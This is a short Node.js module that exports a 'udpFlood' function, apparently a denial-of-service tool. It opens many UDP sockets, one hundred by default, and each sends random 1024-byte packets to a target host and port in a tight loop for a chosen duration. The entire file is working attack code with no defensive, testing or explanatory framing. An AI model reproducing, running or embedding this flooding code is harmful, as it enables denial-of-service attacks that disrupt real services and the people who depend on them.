const dgram = require('dgram');
const crypto = require('crypto');

async function udpFlood(target, duration, intensity = 100) {
  try {
    const url = new URL(target);
    const hostname = url.hostname;
    const port = parseInt(url.port) || 80;

    if (!hostname) {
      console.error('Invalid target URL: Hostname is missing.');
      return;
    }

    if (isNaN(port) || port <= 0 || port > 65535) {
      console.error('Invalid target URL: Port is invalid.');
      return;
    }

    console.log(`UDP flood started against ${target} with intensity ${intensity}`);

    const sockets = [];
    for (let i = 0; i < intensity; i++) {
      try {
        const socket = dgram.createSocket('udp4');
        sockets.push(socket);
        flood(hostname, port, duration, socket);
      } catch (socketError) {
        console.error(`Error creating socket: ${socketError}`);
      }
    }

    await new Promise(resolve => setTimeout(resolve, duration * 1000));

    sockets.forEach(socket => {
      try {
        if (socket && !socket.closed) {
          socket.close();
        }
      } catch (err) {
        console.error(`Error closing socket: ${err}`);
      }
    });

    console.log(`UDP flood finished against ${target}`);
  } catch (error) {
    console.error(`Error processing target URL: ${error}`);
  }
}

async function flood(hostname, port, duration, socket) {
  const startTime = Date.now();
  while (Date.now() - startTime < duration * 1000) {
    try {
      const message = crypto.randomBytes(1024);

      socket.send(message, port, hostname, (err) => {
        if (err) {
          console.error(`UDP send error: ${err}`);
        }
      });

    } catch (error) {
      console.error(`Error creating or sending UDP packet: ${error}`);
    }
    await new Promise(resolve => setTimeout(resolve, 0));
  }
}

module.exports = { udpFlood };